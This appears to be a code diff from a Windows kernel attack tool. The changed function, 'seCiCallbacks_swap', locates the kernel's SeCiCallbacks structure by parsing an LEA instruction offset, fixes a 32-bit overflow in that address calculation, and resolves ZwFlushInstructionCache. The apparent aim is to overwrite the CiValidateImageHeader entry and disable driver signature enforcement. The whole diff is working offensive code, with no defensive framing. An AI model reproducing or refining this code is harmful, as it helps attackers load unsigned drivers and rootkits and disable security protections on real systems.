@@ -148,18 +148,19 @@ seCiCallbacks_swap getCiValidateImageHeaderEntry()
 	{
 		Printf(L"[*] Instr : %p\n", seCiCallbacksInstr);
 	}
-	DWORD seCiCallbacksLeaOffset = *(DWORD64*)(seCiCallbacksInstr + 3);
-	//Printf(L"[!] seCiCallbacksLeaOffset : %x\n", seCiCallbacksLeaOffset);
+	DWORD32 seCiCallbacksLeaOffset = *(DWORD32*)(seCiCallbacksInstr + 3);
+	//Printf(L"[!] seCiCallbacksLeaOffset : %p\n", seCiCallbacksLeaOffset);
+	// The LEA instruction searched for does 32bit math, hence overflow into the more significant 32 bits must be prevented.
+	DWORD32 seCiCallbacksInstrLow = (DWORD32)seCiCallbacksInstr;
+	DWORD32 seCiCallbacksAddrLow = seCiCallbacksInstrLow + 3 + 4 + seCiCallbacksLeaOffset;
 	// calc struct's address in usermode
-	DWORD64 seCiCallbacksAddr = seCiCallbacksInstr + 3 + 4 + seCiCallbacksLeaOffset;
+	DWORD64 seCiCallbacksAddr = (seCiCallbacksInstr & 0xFFFFFFFF00000000) + seCiCallbacksAddrLow;
 	Printf(L"[*] usermode CiCallbacks : %p\n", seCiCallbacksAddr);
 	// calc offset form base 
 	DWORD64 KernelOffset = seCiCallbacksAddr - uNtAddr;
-	Printf(L"[*] Offset  : %x\n", KernelOffset);
+	Printf(L"[*] Offset  : %p\n", KernelOffset);
 	// Calc struct address in kernel based on offset 
-	DWORD64 kernelAddress = (DWORD64)kModuleBase + KernelOffset;
-//	Printf(L"[!]  : %p\n", kModuleBase);
-	Printf(L"[*] KernelAddress : %p\n", kernelAddress);
+	DWORD64 kernelAddress = kModuleBase + KernelOffset;
 	// Resolving the kernel nt!zwFlushInstructionCache address
 	DWORD64 zwFlushInstructionCache = (DWORD64)GetProcAddress(uNt, "ZwFlushInstructionCache") - uNtAddr + (DWORD64)kModuleBase;
 	// add hardcoded offset to the SeCiCallbacks struct to get to CiValidateImageHeader's entry 
